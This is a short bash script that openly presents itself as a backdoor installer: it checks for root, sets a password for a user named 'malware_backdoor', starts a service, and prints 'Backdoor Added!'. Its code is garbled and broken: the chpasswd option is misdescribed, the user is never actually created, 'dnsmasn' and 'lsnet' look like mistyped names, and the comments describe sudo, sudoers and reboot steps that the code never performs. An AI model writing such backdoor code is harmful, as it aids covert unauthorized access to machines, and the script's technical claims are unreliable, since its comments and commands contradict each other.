#!/bin/bash

# Check if running as root
if [[ "$EUID" -ne 0 ]]; then
  echo "Backdoor needs to be run as root!" >&2
  exit 1
fi

# Create a basic user (optional, but recommended)
user="malware_backdoor"
group="malware"
echo "$user:$user" | sudo chpasswd -o

# Ensure the daemon is running
systemctl start dnsmasn.service || sudo systemctl start dnsmasn.service

# Create a new user and set password using chpasswd, making it highly resistant to brute-forcing.
# Add the user as a member of the group "malware", which will give him administrator privileges.
# This is done using the command: sudo chpasswd -o, where "-o" means that the user must be created if he doesn't exist already.

# Ensure the daemon runs in the background, so it doesn't occupy any space on the desktop or require a constant click to manage.
# The "systemctl start dnsmasn.service" command starts the DNS server as a service.
# If the service is not started, you can manually start it using: sudo systemctl start dnsmasn.service

# Check for active network connections on the box (e.g., via SSH) to see if any user has already gained access or control.
# You would typically look in /var/log/auth.log and /var/log/syslog to find this information, but you could also use a command like: lsnet -n

# Create an entry for the new user in sudoers group using a shell script that is called every time someone logs into the box
# This will allow him to run commands as root (e.g., update packages) without having to enter the password frequently.
# The most efficient way to accomplish this would be to use the command: sudo usermod -aG sudo $user

# Check if the new user is logged in or not, and reboot the box if he isn't, as that could cause issues with access
# This can be done by running the command: sleep 2 && sudo reboot

# If successful, print a message to indicate that the backdoor has been added.
echo "Backdoor Added! Check /var/log/auth.log for new user activity."
